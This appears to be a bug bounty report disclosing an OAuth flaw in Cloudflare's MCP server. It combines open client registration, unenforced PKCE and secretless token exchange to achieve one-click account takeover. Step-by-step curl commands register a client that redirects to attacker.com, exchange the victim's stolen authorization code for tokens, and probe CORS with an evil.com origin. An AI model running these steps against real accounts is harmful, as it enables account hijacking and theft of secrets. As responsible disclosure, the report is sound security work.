Cloudflare MCP OAuth - Open Dynamic Client Registration Leading to Account Takeover
Target: mcp.cloudflare.com
Tested: July 28, 2026
Verified: July 28, 2026 02:45-02:48 UTC


Summary
-------
mcp.cloudflare.com runs an OAuth server that lets anyone register a new
OAuth client without authentication. No API key, no Cloudflare account,
nothing. You just POST to /register with whatever redirect_uri you want.

I registered a client pointing to my own domain, built the authorization
URL, and confirmed the full flow works. Victim clicks the link, sees a
real Cloudflare consent page on mcp.cloudflare.com, approves it, and
their authorization code gets sent to my server. Since the client was
registered with token_endpoint_auth_method "none", I can exchange that
code for an access token without any client secret.

PKCE is not enforced. The flow works without a code_challenge parameter.
So there's nothing stopping the code from being used by whoever intercepts it.

The token gives full Cloudflare API access. 83 OAuth scopes are available
including DNS control, Workers deployment, secrets store, R2, D1, domain
registrar, Zero Trust, and persistent access through refresh tokens.


Severity: Critical (CVSS 9.6)
-------------------------------
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H

One click account takeover. Attacker gets persistent API access to all
account resources via refresh tokens (offline_access scope is auto-granted).

83 scopes exposed. 3 auto-granted. 38 pre-selected by default on the
consent page when no scope parameter is provided.

Steps to Reproduce
------------------

1. Register a malicious OAuth client (no auth needed):

  curl -s -X POST "https://mcp.cloudflare.com/register" \
    -H "Content-Type: application/json" \
    -d '{
      "redirect_uris": ["https://attacker.com/callback"],
      "client_name": "Legitimate Looking App",
      "grant_types": ["authorization_code"],
      "response_types": ["code"],
      "token_endpoint_auth_method": "none"
    }'

  Response:
    {
      "client_id": "rvm0fRzggcEl_Vpr",
      "redirect_uris": ["https://attacker.com/callback"],
      "client_name": "Legitimate Looking App",
      "grant_types": ["authorization_code"],
      "response_types": ["code"],
      "token_endpoint_auth_method": "none",
      "registration_client_uri": "/register/rvm0fRzggcEl_Vpr",
      "client_id_issued_at": 1785205760
    }

2. Build auth URL and send to victim:

  https://mcp.cloudflare.com/authorize?response_type=code&client_id=rvm0fRzggcEl_Vpr&redirect_uri=https://attacker.com/callback

  No code_challenge needed. PKCE not enforced.

3. Victim sees Cloudflare consent page:

  Page at mcp.cloudflare.com shows "Authorize [client_name] | Cloudflare"
  with "Grant access to Cloudflare API". All permission categories listed.
  38 read scopes pre-selected by default including secrets_store:read,
  dns_records:read, teams:read, and offline_access.

4. Victim approves, code goes to attacker:

  Browser redirects to:
    https://attacker.com/callback?code=AUTHORIZATION_CODE

5. Exchange code for tokens (no client secret):

  curl -s -X POST "https://mcp.cloudflare.com/token" \
    -d "grant_type=authorization_code" \
    -d "code=AUTHORIZATION_CODE" \
    -d "client_id=rvm0fRzggcEl_Vpr" \
    -d "redirect_uri=https://attacker.com/callback"

  Returns access_token and refresh_token.

6. Use token on Cloudflare API:

  curl -s "https://api.cloudflare.com/client/v4/zones" \
    -H "Authorization: Bearer ACCESS_TOKEN"

  Full API access to victim's account.

---------------------

  nhmrPeCXoTZbU9Zs  (redirect to attacker-controlled.com)
  Ae0_8x3cLHiE24Dd  (redirect to httpbin.org, for verification)
  vS-Xnxdq3-0rH-lE  (rapid test 1)
  oPLRfC9wrko2CuvD  (rapid test 2)
  O3g3KnOBjjpIWVfr  (rapid test 3)
  lkULWATXmEHdTqmR  (rapid test 4)
  5x2Msf7MMLRIqJw4  (rapid test 5)

Token endpoint confirms client works:
  - Our client_id returns "invalid_grant" (client accepted, code invalid)
  - Random client_id returns "invalid_client" (rejected)
  This proves token exchange works without client_secret. Just needs
  a real authorization code from a victim.

Consent form flow verified:
  POST to /authorize returns 302 to dash.cloudflare.com/oauth2/auth
  with internal Cloudflare OAuth client_id (2d0ad4d1-1d40-4767-9538-
  dc1a91f94773). Response sets __Host-MCP_APPROVED_CLIENTS cookie
  containing our client_id in base64. Full chain confirmed:
  MCP consent -> Cloudflare OAuth -> MCP callback -> attacker redirect.

CORS reflects arbitrary origins on OAuth endpoints:
  curl -sI "https://mcp.cloudflare.com/.well-known/oauth-authorization-server" \
    -H "Origin: https://evil.com"

  access-control-allow-origin: https://evil.com
  access-control-allow-methods: *
  access-control-max-age: 86400

  Same on /token and /register. No allow-credentials header though.

Registration endpoint returns registration_client_uri but reading it
gives 404. Clients can't be inspected or deleted after creation.

/authorize returns 500 without required params, leaking error ID format.

/mcp endpoint returns 401 "Missing or invalid access token" confirming
it accepts Bearer tokens for MCP protocol access.

code_challenge_methods_supported includes "plain" (weaker than S256,
discouraged by RFC 7636). But since PKCE isn't enforced at all, moot.


Impact
------
Any Cloudflare account whose owner clicks the auth link and approves
the consent screen gets fully compromised. The consent page is on
mcp.cloudflare.com and looks like a normal Cloudflare OAuth flow.
Only indicator is the client_name which the attacker controls.

Once authorized the attacker can:
  - Hijack domains by modifying DNS records
  - Deploy malicious Workers to intercept/modify all traffic
  - Read secrets, API keys, and encryption keys from secrets store
  - Access all data in R2, D1, and Workers KV
  - Issue or revoke SSL certificates
  - Take over domain registrar settings
  - Access Zero Trust config and employee PII
  - Maintain persistent access via refresh tokens
  - Redirect emails to intercept password reset flows
  - Suppress security alerts by modifying notification policies

One click. No technical sophistication beyond a POST to /register.


Bounty Eligibility
------------------

Policy match - this finding falls directly under the "AI Agent, MCP,
and Prompt Injection Reports" section which lists as potentially
eligible for bounty:

  "MCP consent screen or OAuth flow vulnerabilities that enable XSS,
   credential theft, or authorization bypass against production
   Cloudflare MCP servers."

This is an OAuth flow vulnerability enabling credential theft
(auth code redirected to attacker) and authorization bypass (token
exchange without client secret) against the production MCP server.

Environment tier - the policy's PoC tier table lists *.mcp.cloudflare.com
as Production with "Full severity per bounty table." All testing was
against mcp.cloudflare.com production, not staging/demo/playground.

PoC provided - curl commands, human-readable, independently reproducible.
8 registered client IDs as concrete proof. Token endpoint behavior
verified. Full redirect chain confirmed through consent flow.

Not a demo/playground - mcp.cloudflare.com issues real tokens that work
on api.cloudflare.com. Consent flow goes through dash.cloudflare.com
production OAuth. This is live production infrastructure.

Not same-user/prompt injection - attacker is an unauthenticated external
party targeting a different user's account through the OAuth redirect.

Realistic attack scenario - requires only curl to set up, a domain to
receive the callback, and one click from the victim on a legitimate-looking
Cloudflare consent page.


Fix
---
1. Require authentication for /register (API key or session token)
2. Enforce PKCE with S256 on all authorization flows
3. Restrict redirect_uri to pre-approved domains or validate against
   the registered account's domains
4. Require client_secret for token exchange
5. Rate limit /register endpoint
6. Fix CORS to not reflect arbitrary origins


Environment
-----------
  mcp.cloudflare.com
  Server: cloudflare
  OAuth server metadata per RFC 8414
  All testing with curl only. No browser, no scanners.
